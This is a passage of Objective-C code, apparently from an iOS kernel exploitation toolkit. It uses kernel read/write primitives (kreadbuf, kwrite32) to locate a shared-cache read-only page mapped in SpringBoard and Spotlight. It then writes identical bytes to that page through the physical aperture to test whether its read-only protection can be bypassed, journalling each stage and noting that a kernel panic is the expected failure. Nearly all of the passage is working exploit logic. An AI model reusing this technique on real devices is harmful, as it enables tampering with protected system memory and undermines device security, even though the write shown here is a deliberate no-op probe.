            for (NSDictionary<NSString *, id> *candidate in candidates) {
                uint64_t slide = [candidate[@"slide"] unsignedLongLongValue];
                if (slide > UINT64_MAX - kCNDHailMaryRODataEntryUnslid) {
                    [attempts addObject:@{
                        @"slide": CNDHailMaryRODataHex(slide),
                        @"translated": @NO,
                        @"error": @"runtime-address-overflow",
                    }];
                    continue;
                }
                uint64_t runtimeAddress =
                    kCNDHailMaryRODataEntryUnslid + slide;
                NSDictionary<NSString *, id> *springTranslation = nil;
                NSDictionary<NSString *, id> *spotlightTranslation = nil;
                uint64_t physicalFrame = 0;
                uint64_t physicalAddress = 0;
                uint64_t frameKVA = 0;
                NSString *translationError = nil;
                if (!CNDHailMaryProbeTranslateSharedRuntimeAddress(
                        probeReport, runtimeAddress,
                        &springTranslation, &spotlightTranslation,
                        &physicalFrame, &physicalAddress, &frameKVA,
                        &translationError) ||
                    !springTranslation || !spotlightTranslation ||
                    physicalFrame == 0 || physicalAddress < physicalFrame ||
                    physicalFrame == guardedTextPhysicalFrame ||
                    physicalAddress - physicalFrame != expectedOffset ||
                    !is_kaddr_valid(frameKVA) ||
                    expectedOffset >
                        kCNDHailMaryRODataPageSize - EARLY_KRW_LENGTH) {
                    [attempts addObject:@{
                        @"slide": CNDHailMaryRODataHex(slide),
                        @"runtimeAddress": CNDHailMaryRODataHex(
                            runtimeAddress),
                        @"translated": @NO,
                        @"error": translationError ?:
                            @"shared-frame-translation-invalid",
                    }];
                    continue;
                }

                uint64_t windowKVA = frameKVA + expectedOffset;
                uint8_t bytes[EARLY_KRW_LENGTH] = {0};
                kreadbuf(windowKVA, bytes, sizeof(bytes));
                NSData *data = [NSData dataWithBytes:bytes
                                               length:sizeof(bytes)];
                NSString *sha = CNDHailMaryRODataSHA256(data);
                uint64_t entry = 0;
                memcpy(&entry, bytes, sizeof(entry));
                BOOL exactBytes = [data isEqualToData:expectedGuard];
                BOOL exactSHA = [[sha lowercaseString]
                    isEqual:@CND_HAIL_MARY_RO_DATA_GUARD_SHA256];
                NSDictionary<NSString *, id> *attempt = @{
                    @"slide": CNDHailMaryRODataHex(slide),
                    @"sources": candidate[@"sources"] ?: @[],
                    @"runtimeAddress": CNDHailMaryRODataHex(runtimeAddress),
                    @"translated": @YES,
                    @"physicalFrame": CNDHailMaryRODataHex(physicalFrame),
                    @"physicalAddress": CNDHailMaryRODataHex(
                        physicalAddress),
                    @"frameKernelVirtualAddress": CNDHailMaryRODataHex(
                        frameKVA),
                    @"windowKernelVirtualAddress": CNDHailMaryRODataHex(
                        windowKVA),
                    @"bytesHex": CNDHailMaryRODataBytesHex(
                        bytes, sizeof(bytes)),
                    @"sha256": sha,
                    @"entryValue": CNDHailMaryRODataHex(entry),
                    @"exactBytesMatch": @(exactBytes),
                    @"exactSHA256Match": @(exactSHA),
                };
                [attempts addObject:attempt];
                if (exactBytes && exactSHA &&
                    entry == kCNDHailMaryRODataOriginalEntry) {
                    [matches addObject:@{
                        @"slide": @(slide),
                        @"runtimeAddress": @(runtimeAddress),
                        @"physicalFrame": @(physicalFrame),
                        @"physicalAddress": @(physicalAddress),
                        @"frameKVA": @(frameKVA),
                        @"windowKVA": @(windowKVA),
                        @"springBoard": springTranslation,
                        @"spotlight": spotlightTranslation,
                    }];
                }
            }
            NSMutableDictionary<NSString *, id> *slideScan =
                [report[@"slideScan"] mutableCopy];
            slideScan[@"attempts"] = attempts;
            slideScan[@"matchingCandidateCount"] = @(matches.count);
            report[@"slideScan"] = slideScan;
            if (matches.count != 1) {
                report[@"result"] = matches.count == 0
                    ? @"read-only-data-guard-not-found"
                    : @"read-only-data-guard-ambiguous";
                report[@"message"] = matches.count == 0
                    ? @"No live slide candidate translated to the exact offline .34 guard in both processes. No write was attempted."
                    : @"More than one live slide candidate matched the exact .34 guard. No write was attempted.";
                CNDHailMaryRODataFinish(report, completion);
                return;
            }

            NSDictionary<NSString *, id> *match = matches.firstObject;
            uint64_t matchedSlide = [match[@"slide"] unsignedLongLongValue];
            uint64_t runtimeAddress =
                [match[@"runtimeAddress"] unsignedLongLongValue];
            uint64_t physicalFrame =
                [match[@"physicalFrame"] unsignedLongLongValue];
            uint64_t physicalAddress =
                [match[@"physicalAddress"] unsignedLongLongValue];
            uint64_t frameKVA = [match[@"frameKVA"] unsignedLongLongValue];
            uint64_t windowKVA = [match[@"windowKVA"] unsignedLongLongValue];
            report[@"runtimeIdentity"] = @{
                @"runtimeVerified": @YES,
                @"sharedCacheSlide": CNDHailMaryRODataHex(matchedSlide),
                @"runtimeEntryVirtualAddress": CNDHailMaryRODataHex(
                    runtimeAddress),
                @"unslidInvariant": CNDHailMaryRODataHex(
                    runtimeAddress - matchedSlide),
                @"physicalFrame": CNDHailMaryRODataHex(physicalFrame),
                @"physicalAddress": CNDHailMaryRODataHex(physicalAddress),
                @"frameKernelVirtualAddress": CNDHailMaryRODataHex(frameKVA),
                @"windowKernelVirtualAddress": CNDHailMaryRODataHex(
                    windowKVA),
                @"offsetWithinFrame": CNDHailMaryRODataHex(expectedOffset),
                @"guardedTextPhysicalFrame": CNDHailMaryRODataHex(
                    guardedTextPhysicalFrame),
                @"differsFromGuardedTextPhysicalFrame": @(
                    physicalFrame != guardedTextPhysicalFrame),
                @"springBoard": match[@"springBoard"],
                @"spotlight": match[@"spotlight"],
            };

            report[@"stage"] = @"final-prewrite-identity-check";
            NSDictionary<NSString *, id> *finalSpring = nil;
            NSDictionary<NSString *, id> *finalSpotlight = nil;
            uint64_t finalFrame = 0;
            uint64_t finalPhysical = 0;
            uint64_t finalFrameKVA = 0;
            NSString *finalTranslationError = nil;
            if (!CNDHailMaryProbeTranslateSharedRuntimeAddress(
                    probeReport, runtimeAddress,
                    &finalSpring, &finalSpotlight,
                    &finalFrame, &finalPhysical, &finalFrameKVA,
                    &finalTranslationError) ||
                finalFrame != physicalFrame ||
                finalPhysical != physicalAddress ||
                finalFrameKVA != frameKVA) {
                report[@"result"] = @"final-prewrite-translation-changed";
                report[@"message"] = finalTranslationError ?:
                    @"The .34 translation changed after the slide scan. No write was attempted.";
                CNDHailMaryRODataFinish(report, completion);
                return;
            }

            uint8_t beforeBytes[EARLY_KRW_LENGTH] = {0};
            kreadbuf(windowKVA, beforeBytes, sizeof(beforeBytes));
            NSData *beforeData = [NSData dataWithBytes:beforeBytes
                                                 length:sizeof(beforeBytes)];
            uint32_t existingWord = 0;
            uint64_t existingEntry = 0;
            memcpy(&existingWord, beforeBytes, sizeof(existingWord));
            memcpy(&existingEntry, beforeBytes, sizeof(existingEntry));
            BOOL finalBytesMatch = [beforeData isEqualToData:expectedGuard];
            BOOL finalSHAMatch = [[CNDHailMaryRODataSHA256(beforeData)
                lowercaseString]
                isEqual:@CND_HAIL_MARY_RO_DATA_GUARD_SHA256];
            report[@"finalGuard"] = @{
                @"bytesHex": CNDHailMaryRODataBytesHex(
                    beforeBytes, sizeof(beforeBytes)),
                @"sha256": CNDHailMaryRODataSHA256(beforeData),
                @"exactBytesMatch": @(finalBytesMatch),
                @"exactSHA256Match": @(finalSHAMatch),
                @"entryValue": CNDHailMaryRODataHex(existingEntry),
                @"firstWord": CNDHailMaryRODataHex(existingWord),
            };
            if (!finalBytesMatch || !finalSHAMatch ||
                existingEntry != kCNDHailMaryRODataOriginalEntry ||
                existingWord != kCNDHailMaryRODataOriginalFirstWord) {
                report[@"result"] = @"final-prewrite-guard-changed";
                report[@"message"] = @"The .34 guard changed after runtime identity proof. No write was attempted.";
                CNDHailMaryRODataFinish(report, completion);
                return;
            }

            report[@"stage"] = @"armed-identical-bytes-noop-write";
            report[@"recovery"] = @{
                @"automaticRollbackEnabled": @NO,
                @"panicRecoveryMechanismInstalled": @NO,
                @"reason": @"The single dispatch writes the exact identical 32-byte window; there is no semantic state to restore.",
                @"readbackPlanned": @YES,
                @"postflightTranslationPlanned": @YES,
                @"panicHypothesis": @"If the physical aperture honors this .34 mapping's maxProt=r--, the store aborts and the kernel panics. The durable journal identifies that boundary.",
            };
            report[@"write"] = @{
                @"route": @"kwrite32-identical-window",
                @"windowKernelVirtualAddress": CNDHailMaryRODataHex(
                    windowKVA),
                @"existingWord": CNDHailMaryRODataHex(existingWord),
                @"writtenWord": CNDHailMaryRODataHex(existingWord),
                @"bytesIdenticalByConstruction": @YES,
                @"semanticMutationPlanned": @NO,
                @"dispatchReturned": @NO,
            };
            NSString *journalError = nil;
            if (!CNDHailMaryRODataSaveDurably(
                    report, reportPath, &journalError)) {
                report[@"result"] = @"prewrite-journal-sync-failed";
                report[@"message"] = journalError ?:
                    @"The prewrite journal could not be made durable.";
                CNDHailMaryRODataFinish(report, completion);
                return;
            }

            report[@"kernelWritePrimitiveInvocationCount"] = @1;
            report[@"semanticMutationCount"] = @0;
            kwrite32(windowKVA, existingWord);

            report[@"write"] = @{
                @"route": @"kwrite32-identical-window",
                @"windowKernelVirtualAddress": CNDHailMaryRODataHex(
                    windowKVA),
                @"existingWord": CNDHailMaryRODataHex(existingWord),
                @"writtenWord": CNDHailMaryRODataHex(existingWord),
                @"bytesIdenticalByConstruction": @YES,
                @"semanticMutationPlanned": @NO,
                @"dispatchReturned": @YES,
            };
            report[@"stage"] = @"noop-write-dispatched";
            report[@"physicalReadbackPerformed"] = @YES;
            uint8_t afterBytes[EARLY_KRW_LENGTH] = {0};
            kreadbuf(windowKVA, afterBytes, sizeof(afterBytes));
            NSData *afterData = [NSData dataWithBytes:afterBytes
                                                length:sizeof(afterBytes)];
            BOOL readbackIdentical = [afterData isEqualToData:beforeData] &&
                [afterData isEqualToData:expectedGuard];
            report[@"readback"] = @{
                @"bytesHex": CNDHailMaryRODataBytesHex(
                    afterBytes, sizeof(afterBytes)),
                @"sha256": CNDHailMaryRODataSHA256(afterData),
                @"identicalToBefore": @(readbackIdentical),
                @"exactOfflineGuard": @([afterData
                    isEqualToData:expectedGuard]),
            };

            report[@"stage"] = @"post-write-translation";
            report[@"postflightTranslationPerformed"] = @YES;
            NSDictionary<NSString *, id> *postSpring = nil;
            NSDictionary<NSString *, id> *postSpotlight = nil;
            uint64_t postFrame = 0;
            uint64_t postPhysical = 0;
            uint64_t postFrameKVA = 0;
            NSString *postError = nil;
            BOOL postTranslationStable =
                CNDHailMaryProbeTranslateSharedRuntimeAddress(
                    probeReport, runtimeAddress,
                    &postSpring, &postSpotlight,
                    &postFrame, &postPhysical, &postFrameKVA,
                    &postError) &&
                postFrame == physicalFrame &&
                postPhysical == physicalAddress &&
                postFrameKVA == frameKVA;
            report[@"postWriteTranslation"] = postTranslationStable
                ? @{
                    @"performed": @YES,
                    @"stable": @YES,
                    @"physicalFrame": CNDHailMaryRODataHex(postFrame),
                    @"physicalAddress": CNDHailMaryRODataHex(postPhysical),
                    @"springBoard": postSpring,
                    @"spotlight": postSpotlight,
                }
                : @{
                    @"performed": @YES,
                    @"stable": @NO,
                    @"error": postError ?:
                        @"post-write-translation-changed",
                };

            BOOL confirmed = readbackIdentical && postTranslationStable;
            report[@"confirmed"] = @(confirmed);
            report[@"result"] = confirmed
                ? @"aperture-read-only-data-page-write-confirmed"
                : (readbackIdentical
                    ? @"post-write-translation-unstable"
                    : @"aperture-read-only-data-page-readback-mismatch");
            report[@"message"] = confirmed
                ? @"The exact .34 guard was proven live in both processes and its identical-bytes dispatch returned; readback remained exact and both translations stayed stable. The physical aperture accepts writes to this read-only-data page despite maxProt=r--."
                : (readbackIdentical
                    ? @"The .34 identical-bytes dispatch returned and readback stayed exact, but a post-write translation changed."
                    : @"The .34 identical-bytes dispatch returned but the guarded window did not read back exactly.");
            CNDHailMaryRODataFinish(report, completion);
        });
    });
}
